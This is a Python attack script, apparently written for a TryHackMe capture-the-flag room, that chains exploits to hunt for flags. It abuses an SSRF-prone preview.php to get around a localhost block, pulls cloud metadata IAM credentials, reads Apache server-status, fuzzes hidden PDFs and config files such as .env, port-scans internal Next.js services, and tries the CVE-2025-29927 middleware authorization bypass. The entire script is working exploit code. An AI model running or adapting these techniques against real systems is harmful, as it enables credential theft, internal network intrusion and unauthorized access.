import requests
import urllib.parse
import re
import zlib

PREVIEW   = "http://10.82.159.192/preview.php"
TARGET    = "http://10.82.159.192"
INT_HOST  = "cvssm1"      # localhost/127.0.0.1 are keyword-blocked by preview.php
FLAG_RE   = re.compile(r"THM\{[^}]+\}")
BYPASS_HEADER = "x-middleware-subrequest"
BYPASS_VALUES = [
    "middleware",
    "src/middleware",
    "middleware:middleware:middleware:middleware:middleware",
    "pages/_middleware",
    "src/middleware:src/middleware:src/middleware:src/middleware:src/middleware",
]
PROTECTED_ROUTES = [
    "/admin", "/admin/dashboard", "/dashboard",
    "/flag", "/api/flag", "/api/admin", "/premium", "/api/secret",
]
# Only probe common Next.js ports — mass scan was overwhelming the server
NEXTJS_PORTS = [3000, 3001, 3002, 4000, 5000, 8080, 8443, 9000, 1337, 8888]

# PDF candidate names for the library app (room code "extract")
PDF_CANDIDATES = [
    "premium.pdf", "secret.pdf", "flag.pdf", "flags.pdf", "admin.pdf",
    "private.pdf", "internal.pdf", "book3.pdf", "book4.pdf",
    "extract.pdf", "room.pdf", "premium-room.pdf", "confidential.pdf",
    "secrets.pdf", "notes.pdf", "restricted.pdf", "hidden.pdf",
]

NAME_SUFFIXES = [
    "", "-backup", "-old", "-v1", "-v2", "-final", "-draft", "-private", "-internal",
]


def normalize_pdf_name(value):
    v = value.strip().split("?")[0].split("#")[0]
    v = v.rsplit("/", 1)[-1]
    if not v:
        return ""
    if v.lower().endswith(".pdf"):
        v = v[:-4]
    return v.strip().lower()


def extract_seed_names_from_homepage(html):
    seeds = set()

    # Document labels shown in the list (e.g., Dummy, Lorem)
    for m in re.findall(r"openPdf\('[^']+'\)\">([^<]+)<", html, re.IGNORECASE):
        n = re.sub(r"[^a-zA-Z0-9_-]", "", m).lower()
        if n:
            seeds.add(n)

    # Basenames from explicit PDF URLs
    for m in re.findall(r"/pdf/([^/\"'?#]+)", html, re.IGNORECASE):
        n = normalize_pdf_name(m)
        if n:
            seeds.add(n)

    # Title words are often intentional naming hints.
    title_match = re.search(r"<title>([^<]+)</title>", html, re.IGNORECASE)
    if title_match:
        for t in re.findall(r"[a-zA-Z]{4,}", title_match.group(1)):
            seeds.add(t.lower())

    # explicit room code hint from your environment
    seeds.add("extract")
    return sorted(seeds)


def build_candidate_names(seed_names, observed_names=None):
    names = set(normalize_pdf_name(x) for x in PDF_CANDIDATES)
    for s in seed_names or []:
        n = normalize_pdf_name(s)
        if n:
            names.add(n)
    for s in observed_names or []:
        n = normalize_pdf_name(s)
        if n:
            names.add(n)

    base_words = sorted(names)
    for b in base_words:
        for suf in NAME_SUFFIXES:
            names.add((b + suf).strip("-"))
        names.add(f"{b}-flag")
        names.add(f"{b}-secret")
        names.add(f"{b}-notes")
        names.add(f"{b}-restricted")
        names.add(f"{b}-hidden")

    # Keep probe set bounded so requests stay fast/stable.
    out = sorted(n for n in names if n and len(n) <= 40)
    return out[:180]


def is_probable_404(text):
    t = (text or "").lower()
    return "<title>404 not found</title>" in t or "<h1>not found</h1>" in t


def ssrf_get(url, timeout=8):
    q = urllib.parse.quote(url, safe="")
    r = requests.get(f"{PREVIEW}?url={q}", timeout=timeout)
    return r


def find_flags(data):
    """Find THM flags in both text and raw bytes (PDF streams)."""
    hits = set()
    text = data if isinstance(data, str) else data.decode("utf-8", errors="ignore")
    hits.update(FLAG_RE.findall(text))

    if isinstance(data, bytes):
        # Try decompressing zlib PDF streams
        for m in re.finditer(rb"stream\r?\n", data):
            chunk = data[m.end():]
            end = chunk.find(b"endstream")
            if end == -1:
                continue
            chunk = chunk[:end].strip(b"\r\n")
            for cand in (chunk, b"x\x9c" + chunk):
                try:
                    dec = zlib.decompress(cand)
                    hits.update(FLAG_RE.findall(dec.decode("utf-8", errors="ignore")))
                except Exception:
                    pass
    return sorted(hits)


# ─────────────────────────────────────────────────────────────
# Step 0: sanity check
# ─────────────────────────────────────────────────────────────
def sanity_check():
    print("=== Step 0: Sanity check (cvssm1:80 via SSRF) ===")
    try:
        r = ssrf_get(f"http://{INT_HOST}/")
        if "blocked" in r.text.lower():
            print(f"  [!] cvssm1 itself is keyword-blocked: {r.text[:80]}")
            return False
        if r.text.strip():
            print(f"  [+] cvssm1:80 OK — {len(r.text)} bytes")
            return True
        else:
            print(f"  [!] cvssm1:80 returned empty — machine down?")
            return False
    except Exception as e:
        print(f"  [!] Exception: {e}")
        return False


# ─────────────────────────────────────────────────────────────
# Step 1: Fetch homepage, extract PDF links
# ─────────────────────────────────────────────────────────────
def step_homepage(all_flags):
    print(f"\n=== Step 1: Homepage recon + flag hunt ===")
    r = ssrf_get(f"http://{INT_HOST}/")
    print(f"  cvssm1/ -> {r.status_code} len={len(r.text)}")

    flags = find_flags(r.text)
    if flags:
        print(f"  [FLAG in homepage!] {flags}")
        all_flags.update(flags)

    # Extract openPdf('...') links
    pdf_links = sorted(set(re.findall(r"openPdf\('([^']+)'\)", r.text)))
    # Also look for generic href/src to .pdf
    pdf_links += sorted(set(re.findall(r'(?:href|src)=["\']([^"\']+\.pdf)["\']', r.text, re.IGNORECASE)))
    print(f"  PDF links found: {pdf_links}")

    seed_names = extract_seed_names_from_homepage(r.text)
    print(f"  Seed names from homepage: {seed_names[:20]}")

    print("\n--- Full homepage HTML ---")
    print(r.text)
    print("--- end homepage ---\n")
    return pdf_links, seed_names


# ─────────────────────────────────────────────────────────────
# Step 2: Fetch all PDF links via SSRF + fuzz extras
# ─────────────────────────────────────────────────────────────
def step_pdfs(pdf_links, all_flags, seed_names=None, observed_names=None, pass_name="Step 2"):
    print(f"\n=== {pass_name}: PDF extraction via SSRF ===")
    # Make absolute if needed
    abs_links = []
    for link in pdf_links:
        if link.startswith("http"):
            abs_links.append(link)
        else:
            abs_links.append(f"http://{INT_HOST}{link if link.startswith('/') else '/' + link}")

    # Add fuzzing candidates
    for name in build_candidate_names(seed_names or [], observed_names or []):
        variants = [name]
        if not name.lower().endswith(".pdf"):
            variants.append(f"{name}.pdf")
        for v in variants:
            candidate = f"http://{INT_HOST}/pdf/{v}"
            if candidate not in abs_links:
                abs_links.append(candidate)

    for url in abs_links:
        try:
            q = urllib.parse.quote(url, safe="")
            r = requests.get(f"{PREVIEW}?url={q}", timeout=10)
            raw = r.content
            if not raw or len(raw) < 10:
                continue
            # Skip obvious 404-style responses by content instead of size only.
            if is_probable_404(r.text):
                continue
            if "blocked" in r.text.lower()[:50]:
                print(f"  [blocked] {url}")
                continue
            flags = find_flags(raw)
            tag = " <<< FLAGS!" if flags else ""
            ctype = r.headers.get("Content-Type", "")
            print(f"  {url}  {r.status_code} {len(raw)}b {ctype}{tag}")
            if flags:
                for f in flags:
                    print(f"    >>> {f}")
                all_flags.update(flags)
        except Exception as e:
            print(f"  [exc] {url}: {e}")


# ─────────────────────────────────────────────────────────────
# Step 3: Library-focused deep recon
# ─────────────────────────────────────────────────────────────
def step_direct_pages(all_flags):
    print(f"\n=== Step 3: Deep recon ===")
    observed_names = set()

    # IMDS credentials
    cred_url = "http://169.254.169.254/latest/meta-data/iam/security-credentials/vulnerable-machine"
    try:
        r = ssrf_get(cred_url)
        print(f"\n[IMDS credentials]  ({len(r.text)}b)")
        print(r.text[:600])
        for f in find_flags(r.text):
            print(f"  FLAG: {f}")
            all_flags.add(f)
    except Exception as e:
        print(f"  [exc] IMDS creds: {e}")

    # Apache server-status — look for virtual hosts, request logs, port hints
    try:
        r = ssrf_get(f"http://{INT_HOST}/server-status")
        print(f"\n[server-status]  ({len(r.text)}b)")
        vhosts = set(re.findall(r'(\d+\.\d+\.\d+\.\d+:\d+|cvssm\d+:\d+|[a-z0-9-]+:\d{2,5})', r.text))
        print(f"  Ports/vhosts seen: {sorted(vhosts)}")

        # Mine Apache request table for PDF paths and test them immediately.
        seen_pdf_paths = sorted(set(re.findall(r'GET\s+(/pdf/[^\s<\"]+)', r.text, re.IGNORECASE)))
        if seen_pdf_paths:
            print(f"  PDF paths seen in traffic: {seen_pdf_paths}")
            for p in seen_pdf_paths:
                observed_names.add(normalize_pdf_name(p))
                try:
                    rr = ssrf_get(f"http://{INT_HOST}{p}", timeout=8)
                    flags = find_flags(rr.content)
                    print(f"    probe {p:25} -> {rr.status_code} len={len(rr.content)}")
                    for f in flags:
                        print(f"      >>> {f}")
                        all_flags.add(f)
                except Exception as exc:
                    print(f"    probe {p} ERR: {exc}")

        for f in find_flags(r.text):
            print(f"  FLAG: {f}")
            all_flags.add(f)
        print(r.text[:3000])
    except Exception as e:
        print(f"  [exc] server-status: {e}")

    # Probe library-relevant app paths
    extra_paths = [
        "/books", "/api/books", "/api/books/premium",
        "/user", "/users", "/profile",
        "/login", "/register",
        "/api/auth/session", "/api/auth/providers",
        "/api/", "/api/v1/",
        "/preview.php", "/pdf/",
        "/admin.php", "/robots.txt", "/sitemap.xml",
        "/.env", "/config.php", "/config.inc.php",
        "/flag.txt", "/flag.php",
    ]
    print(f"\n[App route fuzz]")
    for path in extra_paths:
        url = f"http://{INT_HOST}{path}"
        try:
            r = ssrf_get(url, timeout=5)
            size = len(r.text)
            if size in (268, 275):
                continue  # 404
            snip = " ".join(r.text.split())[:100]
            flags = find_flags(r.text)
            tag = " <<< FLAG!" if flags else ""
            print(f"  {path:35} {r.status_code} {size:6}b{tag}  {snip}")
            for f in flags:
                print(f"    >>> {f}")
                all_flags.add(f)
        except Exception as e:
            print(f"  {path:35} ERR: {e}")

    return sorted(x for x in observed_names if x)


# ─────────────────────────────────────────────────────────────
# Step 4: Internal Next.js port scan (small set, sequential)
# ─────────────────────────────────────────────────────────────
def step_nextjs_scan(all_flags):
    print(f"\n=== Step 4: Next.js port scan (cvssm1 only, {len(NEXTJS_PORTS)} ports) ===")
    live_next = []
    for port in NEXTJS_PORTS:
        url = f"http://{INT_HOST}:{port}/"
        try:
            r = ssrf_get(url, timeout=6)
            if "blocked" in r.text.lower():
                print(f"  [blocked] port {port}")
                continue
            if not r.text.strip():
                print(f"  [-] port {port}: empty")
                continue
            is_next = any(x in r.text for x in ["__NEXT_DATA__", "_next/", "next-route", "buildId", "Next.js"])
            snip = " ".join(r.text.split())[:100]
            tag = " [NEXT.JS!]" if is_next else ""
            print(f"  [+] port {port}{tag}  {r.status_code}  {snip}")
            flags = find_flags(r.text)
            if flags:
                for f in flags:
                    print(f"    >>> {f}")
                all_flags.update(flags)
            live_next.append((port, is_next))
        except Exception as e:
            print(f"  [!] port {port}: {e}")
    return live_next


# ─────────────────────────────────────────────────────────────
# Step 5: CVE-2025-29927 bypass on live Next.js ports
# Also try bypass header directly on external IP (all ports)
# ─────────────────────────────────────────────────────────────
def step_cve_bypass(live_next, all_flags):
    print(f"\n=== Step 5: CVE-2025-29927 bypass ===")

    # Direct external hits with bypass header (port 80 and any live Next.js port)
    ext_ports = [80] + [p for p, _ in live_next]
    for port in ext_ports:
        base = f"{TARGET}:{port}" if port != 80 else TARGET
        for bval in BYPASS_VALUES:
            for route in PROTECTED_ROUTES:
                url = f"{base}{route}"
                try:
                    r = requests.get(url, headers={BYPASS_HEADER: bval}, timeout=6, allow_redirects=True)
                    flags = find_flags(r.text)
                    if flags:
                        print(f"  [FLAG! direct] {url}  hdr={bval}")
                        for f in flags:
                            print(f"    >>> {f}")
                        all_flags.update(flags)
                    elif r.status_code == 200 and len(r.text) > 200:
                        snip = " ".join(r.text.split())[:80]
                        print(f"  [?] {url}  {r.status_code}  {snip}")
                except Exception:
                    pass

    # SSRF hits on live internal Next.js ports (bypasses firewall)
    for port, _ in live_next:
        for route in PROTECTED_ROUTES:
            url = f"http://{INT_HOST}:{port}{route}"
            try:
                r = ssrf_get(url)
                flags = find_flags(r.text)
                if flags:
                    print(f"  [FLAG! ssrf] {url}")
                    for f in flags:
                        print(f"    >>> {f}")
                    all_flags.update(flags)
                elif r.text.strip() and "blocked" not in r.text.lower():
                    snip = " ".join(r.text.split())[:80]
                    print(f"  [?] ssrf {url}  {r.status_code}  {snip}")
            except Exception:
                pass


# ─────────────────────────────────────────────────────────────
def main():
    all_flags = set()

    if not sanity_check():
        print("Sanity check failed — is the machine up?")
        return

    pdf_links, seed_names = step_homepage(all_flags)
    step_pdfs(pdf_links, all_flags, seed_names=seed_names, pass_name="Step 2")
    observed_names = step_direct_pages(all_flags)
    if observed_names:
        step_pdfs([], all_flags, seed_names=seed_names, observed_names=observed_names, pass_name="Step 3b")
    live_next = step_nextjs_scan(all_flags)
    step_cve_bypass(live_next, all_flags)

    print("\n" + "=" * 50)
    print("FINAL FLAGS (Library CTF):")
    if all_flags:
        for f in sorted(all_flags):
            print(f"  {f}")
    else:
        print("  None found yet.")
        print("  Hint: focus on library SSRF surfaces (homepage PDF links, /pdf/*, server-status clues).")


if __name__ == "__main__":
    main()
